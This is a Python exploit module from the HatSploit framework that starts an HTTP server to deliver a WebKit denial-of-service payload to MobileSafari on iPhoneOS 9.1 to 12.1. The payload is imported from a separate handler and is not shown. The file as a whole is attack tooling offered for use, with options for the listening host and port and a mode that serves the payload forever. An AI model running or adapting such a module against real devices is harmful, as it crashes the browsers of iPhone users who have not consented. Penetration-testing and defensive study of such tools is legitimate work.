#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

import socketserver

from core.lib.module import Module
from data.modules.exploit.iphoneos.mobile_safari_app.webkit_filter_dos.core.handler import handler
from utils.tcp.tcp import TCPClient


class HatSploitModule(Module, TCPClient):
    details = {
        'Name': "iPhoneOS MobileSafari.app WebKit Filter DoS",
        'Module': "exploit/iphoneos/mobile_safari_app/webkit_filter_dos",
        'Authors': [
            'enty8080'
        ],
        'Description': "iPhoneOS 9.1 till 12.1 MobileSafari.app WebKit Filter DoS.",
        'Dependencies': [
            ''
        ],
        'Comments': [
            ''
        ],
        'Platform': "iphoneos",
        'Risk': "high"
    }

    options = {
        'LHOST': {
            'Description': "Local host.",
            'Value': TCPClient.get_local_host(),
            'Type': "ip",
            'Required': True
        },
        'LPORT': {
            'Description': "Local port.",
            'Value': 80,
            'Type': "port",
            'Required': True
        },
        'FOREVER': {
            'Description': "Start http server forever.",
            'Value': "no",
            'Type': "boolean",
            'Required': False
        }
    }

    def start_http_server(self, local_host, local_port, forever):
        try:
            httpd = socketserver.TCPServer((local_host, int(local_port)), self.handler)
            self.output_process(f"Starting http server on port {local_port}...")
            self.output_process("Serving payload on http server...")
            if forever.lower() in ['yes', 'y']:
                while True:
                    self.output_process("Listening for connections...")
                    httpd.handle_request()
            else:
                self.output_process("Listening for connections...")
                httpd.handle_request()
        except Exception:
            self.output_error(f"Failed to start http server on port {local_port}!")

    def run(self):
        local_host, local_port, forever = self.parse_options(self.options)
        self.start_http_server(local_host, local_port, forever)
